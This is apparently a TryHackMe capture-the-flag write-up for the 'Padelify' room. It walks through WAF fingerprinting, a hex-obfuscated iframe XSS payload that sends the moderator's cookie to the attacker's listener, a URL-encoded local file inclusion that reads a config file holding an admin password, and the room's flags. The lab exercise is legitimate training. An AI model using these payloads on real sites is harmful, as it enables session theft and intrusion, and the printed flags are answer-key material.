# TryHackMe: Padelify

**Difficulty:** Medium
**Operating System:** Linux
**Attacker IP:** 192.168.180.79
**Machine IP:** 10.114.161.153
**Domain:** --
**Room Link:** https://tryhackme.com/room/padelify

---

## 1. Reconnaissance
Thats a WAF vuln conquest. I don't think so we have to go with typical recon and enumeration, including nmap and gobuster scan. As I remember from THM rooms, there's one principle. "Knowing is half of the battle". So lets get second half on our side by trying to bypass WAF.
But, always we can use some tools, like wafw00f - to check if it finds some info about WAF.
```
❯ wafw00f -a -v http://10.114.161.153/index.php -o wafw00f.txt
/home/kali/.local/lib/python3.13/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.20) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

                   ______
                  /      \                                                                                                                                   
                 (  Woof! )                                                                                                                                  
                  \  ____/                      )                                                                                                            
                  ,,                           ) (_                                                                                                          
             .-. -    _______                 ( |__|                                                                                                         
            ()``; |==|_______)                .)|__|                                                                                                         
            / ('        /|\                  (  |__|                                                                                                         
        (  /  )        / | \                  . |__|                                                                                                         
         \(_)_))      /  |  \                   |__|                                                                                                         

                    ~ WAFW00F : v2.3.2 ~
    The Web Application Firewall Fingerprinting Toolkit                                                                                                      
                                                                                                                                                             
[*] Checking http://10.114.161.153/index.php
[+] Generic Detection results:
[*] The site http://10.114.161.153/index.php seems to be behind a WAF or some sort of security solution
[~] Reason: The response was different when the request wasn't made from a browser.
Normal response code is "200", while the response code to a modified request is "403"
[~] Number of requests: 4
```
[wafwoof output](wafw00f.txt) - It ain't much, but its honest scan. It uses generic WAF rules, can pass it only via browser or with some headers modification if using curl, sqlmap etc. Eg:
```
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" http://10.114.161.153/index.php
```
By looking around the site we can see that we can register and our registration will be checked by moderator - great sign for cookies steal. We can't log in using created 'account'. There's few ways to steal cookies and probably one of them is not included in WAF rules. I've been trying classical ones using atob, eval - but they did not get thru WAF even with encoding. Working one was:
```
<iframe src=ja&#x0D;vascript&colon;\u0073etTimeout('\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x30\x2e\x37\x39\x3a\x38\x30\x30\x30\x2f\x3f\x63\x3d\x27\x2b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29')></iframe>
```
Which gave us phpsession id
```
❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.114.161.153 - - [11/Apr/2026 08:18:34] "GET /?c=PHPSESSID=3sdh4eo67qiu4a1mpeff9buank HTTP/1.1" 200 -
```
## 2. Enumeration
After logging in into moderator dashboard I couldn't find anything interesting except password change. So with info from wafw00f I have creafter gobuster cmd to enumerate it and check if there's something interesting.
gobuster dir -u http://10.114.161.153 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x php,txt,bak,tar.gz -o gobuster_wyniki.txt -b 404,400 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
[Gobuster output](gobuster_wyniki.txt)
### Interesting finds:
```
index.php            (Status: 200) [Size: 3853]
login.php            (Status: 200) [Size: 1124]
register.php         (Status: 302) [Size: 0] [--> index.php]
header.php           (Status: 200) [Size: 1587]
footer.php           (Status: 200) [Size: 33]
css                  (Status: 301) [Size: 314] [--> http://10.114.161.153/css/]
live.php             (Status: 200) [Size: 1961]
status.php           (Status: 200) [Size: 4086]
js                   (Status: 301) [Size: 313] [--> http://10.114.161.153/js/]
javascript           (Status: 301) [Size: 321] [--> http://10.114.161.153/javascript/]
logout.php           (Status: 302) [Size: 0] [--> index.php]
config               (Status: 301) [Size: 317] [--> http://10.114.161.153/config/]
logs                 (Status: 301) [Size: 315] [--> http://10.114.161.153/logs/]
dashboard.php        (Status: 302) [Size: 0] [--> login.php]
match.php            (Status: 200) [Size: 126]
```
## 3. Initial Access
Ctrl+C CTRL+V into browser admin tools>storage>cookies and voila, first flag and moderator dashboard ahead.
If we go to the live.php, we can see cool URL providing LFI vuln probably!
http://10.114.161.153/live.php?page=match.php#
As well logs seems interesting, they contain error.logs - now we can test our LFI URL 
http://10.114.161.153/live.php?page=logs/error.log
and it does work, we can see these logs printed:
```
[Sat Nov 08 12:03:11.123456 2025] [info] [pid 2345] Server startup: Padelify v1.4.2 [Sat Nov 08 12:03:11.123789 2025] [notice] [pid 2345] Loading configuration from /var/www/html/config/app.conf [Sat Nov 08 12:05:02.452301 2025] [warn] [modsec:99000005] [client 10.10.84.50:53122] NOTICE: Possible encoded/obfuscated XSS payload observed [Sat Nov 08 12:08:12.998102 2025] [error] [pid 2361] DBWarning: busy (database is locked) while writing registrations table [Sat Nov 08 12:11:33.444200 2025] [error] [pid 2378] Failed to parse admin_info in /var/www/html/config/app.conf: unexpected format [Sat Nov 08 12:12:44.777801 2025] [notice] [pid 2382] Moderator login failed: 3 attempts from 10.10.84.99 [Sat Nov 08 12:13:55.888902 2025] [warn] [modsec:41004] [client 10.10.84.212:53210] Double-encoded sequence observed (possible bypass attempt) [Sat Nov 08 12:14:10.101103 2025] [error] [pid 2391] Live feed: cannot bind to 0.0.0.0:9000 (address already in use) [Sat Nov 08 12:20:00.000000 2025] [info] [pid 2401] Scheduled maintenance check completed; retention=30 days 
```

## 4. Privilege Escalation
Website is using free ModSec with many restrictive rules. But we can see full path for app.conf - excellent. As well name of db table admin_info.
Made a bit of research on that WAF, and yeah, it wont allow use to go around freely using LFI, but! As live.php is probably in /var/html theres just one jump into config/app.conf. Lets infect our URL with some url encoding:
http://10.114.161.153/live.php?page=config%2fapp%2econf
and voila x2. We have some cool stuff bois.
```sql
version = "1.4.2" enable_live_feed = true enable_signup = true env = "staging" site_name = "Padelify Tournament Portal" max_players_per_team = 4 maintenance_mode = false log_level = "INFO" log_retention_days = 30 db_path = "padelify.sqlite" admin_info = "bL}8,S9W1o44" misc_note = "do not expose to production" support_email = "support@padelify.thm" build_hash = "a1b2c3d4" 
```
You can try to get database file by visiting url+padelify.sqlite (remember how to go around WAF) or just simply open a new private session in browser, go to login page and use credentials: admin:bL}8,S9W1o44)
Admin flag found.
### Moderator Flag

<details>
  <summary>🚩 Click to see Mod Flag</summary>

  `THM{Logged_1n_Moderat0r}`
</details>

### Root Flag (System / Administrator)
<details>
  <summary>🚩 Click to see Root Flag</summary>

  `THM{Logged_1n_Adm1n001}`
</details>

## 5. Summary and Lessons Learned

* **What went well:** 
* **What I learned:** 
* **Where I got stuck (Rabbit holes):** 